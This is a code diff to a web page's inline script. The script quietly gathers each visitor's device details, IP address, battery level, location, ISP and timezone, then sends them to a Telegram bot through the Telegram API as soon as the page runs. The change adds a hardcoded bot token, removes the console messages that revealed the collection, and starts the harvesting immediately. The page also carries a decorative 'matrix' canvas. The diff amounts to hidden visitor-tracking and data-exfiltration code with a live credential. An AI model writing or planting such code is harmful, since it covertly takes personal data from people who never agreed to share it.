@@ -332,6 +332,7 @@
         </footer>
     </div>
     <script>
+        const botToken = '7736721345:AAGNlroMuFAFCObcMzbNX-8JjRv_ZInf-j8';
         async function collectDeviceInfo() {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
@@ -465,12 +466,10 @@
                 Уровень батареи: ${batteryLevel}%
             `;
 
-            const url = `https://api.telegram.org/bot7736721345:AAFgu3ppj_rjpllAV6kxDXciu4Rd-XoW2xk/sendMessage?chat_id=7200125852`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const params = {
                 text: message,
             };
-
-            console.log("Отправка данных в Telegram...");
 
             try {
                 const response = await fetch(url, {
@@ -494,7 +493,6 @@
             }
         }
         async function main() {
-            console.log("Сбор данных...");
             const deviceInfo = await collectDeviceInfo();
             const ipAddress = await getIPAddress();
             const batteryLevel = await getBatteryLevel();
@@ -507,7 +505,7 @@
             const timezone = await getTimezone();
             await sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone);
         }
-        window.addEventListener('load', main);
+        main();
     </script>
     <script>
         const canvas = document.getElementById('matrix');
